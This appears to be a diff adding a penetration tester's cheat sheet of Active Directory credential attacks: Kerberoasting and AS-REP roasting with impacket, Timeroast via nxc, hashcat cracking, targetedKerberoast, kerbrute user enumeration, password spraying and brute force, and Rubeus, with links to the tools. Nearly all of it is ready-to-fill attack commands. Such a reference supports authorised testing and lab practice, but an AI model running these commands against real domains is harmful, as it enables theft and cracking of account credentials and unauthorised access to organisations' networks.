@@ -1,0 +1,65 @@
+--------------------------------
+     Kerberoasting Attack
+--------------------------------
+
+impacket-GetUserSPNs <domain.local>/<username>:'<password>'
+impacket-GetUserSPNs <domain.local>/<username>:'<password>' -dc-ip <ip>
+impacket-GetUserSPNs <domain.local>/<username>:'<password>' -k -no-pass -dc-host <dc.hostname.local>
+
+--------------------------------
+Kerberoasting Attack - NO_PREAUTH
+--------------------------------
+
+impacket-GetNPUsers <domain.local>/<username>:'<password>'
+impacket-GetNPUsers <domain.local>/<username>:'<password>' -dc-ip <ip>
+impacket-GetNPUsers <domain.local>/<username>:'<password>' -k -no-pass -dc-host <dc.hostname.local>
+
+--------------------------------
+Kerberoasting Attack - getTGT
+--------------------------------
+
+impacket-getTGT <domain.local>/<username>:'<password>' -dc-ip <ip>
+impacket-getTGT <domain.local>/<username>:'<password>' -k -no-pass -dc-host <dc.hostname.local>
+
+--------------------------------
+Kerberoasting Attack - Timeroast
+--------------------------------
+
+nxc smb <dc.hostname.local> -u <username> -p <password> -M timeroast
+nxc smb <dc.hostname.local> -u <username> --use-kcache -M timeroast
+
+--------------------------------
+Cracking Timeroast with Hashcat
+--------------------------------
+- require hashcat beta version (https://hashcat.net/beta/hashcat-6.2.6+1121.7z)
+
+hashcat -m 31300 hash.txt rockyou.txt
+
+
+--------------------------------
+Kerberoasting Attack - TargetedKerberoast
+--------------------------------
+- https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py
+
+python3 targetedKerberoast.py -v -d <domain.local> -u <username> -p <password>
+python3 targetedKerberoast.py -v -d <domain.local> -u <username> -k -no-pass -dc-ip <ip>
+
+--------------------------------
+Kerberoasting Attack - Kerbrute
+--------------------------------
+- https://github.com/ropnop/kerbrute/releases/tag/v1.0.3
+
+./kerbrute userenum -d <domain.local> <username.txt>
+./kerbrute passwordspray -d <domain.local> <username.txt> Password123
+./kerbrute bruteuser -d <domain.local> <password.txt> Username123
+
+
+--------------------------------
+Kerberoasting Attack - Rubeus
+--------------------------------
+- https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe
+
+./Rubeus.exe kerberoast /domain:<domain.local> /user:<username> /nowrap
+
+
+
